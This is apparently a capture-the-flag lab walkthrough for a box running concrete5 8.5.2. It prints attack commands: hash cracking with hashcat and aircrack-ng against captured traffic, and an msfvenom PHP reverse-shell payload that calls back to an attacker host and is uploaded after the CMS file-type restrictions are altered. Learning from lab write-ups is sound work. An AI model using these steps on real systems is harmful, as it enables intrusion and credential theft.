Started with a nmap scan 
```
80 Apache 2.4.29
4012 OpenSSH 7.6p1
4019 vsftpd 3.0.3
```
Starting with the ftp nmap tells us that anonymous login is allowed there are three files we can only download the note from the ftp says that someone hacked into the network the cap file is wireshark logs and a website was missing 
```
.cap
IDS_logs
note.txt
```
Starting a gobuster scan with `2.3-medmium` seems like there is nothing in the web root folder and everything is under `concrete5` folder
```
index.php
/updates
/packages
/application
/concrete
/robots.txt
```

The cms running on this webserver is `concrete5 8.5.2` 

Downloading all the files from the ftp with this command
`wget ftp://anonymous@10.10.206.207:4019/` 
and downloads a bunch of files looking at the pcap files one stands out to have a `ntlmssp` in it file called `14-01-21.pcappng` there a user called `3B\lgreen` and we can see the `ntlmhash` and challenge we can crack it with hashcat 
`hashcat -m 5600 hash rockyou.txt -o cracked`
domain `3B` user `lgreen` password `P....0rd` 
and now looking at the other folders it downloaded `.cap` there is a note in there and a another cap file from looking at the note looks like there was a wifi attack so lets see if we can crack it
`aircrack-ng SamsNetwork.cap -w rockyou.txt` cracked the wifi key `sa...go` 
Going back to the website we get a list of users to try from looking around the site
```
Benjamin_Blogger
Lucy_Loser
Adam_Admin
Donald_dump
lgreen
```
Testing all these logins with the 2 passwords we found one logins in
`Donald_dump:s....ago` 
After logging in we see a bunch of errors but if we remove the `/welcome` from the url and we get the main dashboard from when looking on google before we had logins I found a site that shows how to get a rev shell from the admin user which we not got we need to go to `system settings` and go to `allow file tpyes` and a php in there and now we can upload a php shell 
`msfvenom -p php/reverse_php LHOST=10.13.8.255 LPORT=1234 > shell.php`
Found the database password and user and got the hashes form the database and see if they crack looing in all the folders found one in the `donalddump` users folder and in the image `d.png` it has text overlapping each other but if you open it in gimp and scale the image you can see what looks like a password `$$L3q.....ol` and we got ssh access as the user now to access are home folder we need to give us access `chmod 777 donalddump` and see can see a file passwd its a vnc passwd word 
	`vncviwer -passwd passwd 10.10.206.207::5901` 
And now we have root and can find the root flag in the `.nothing` folder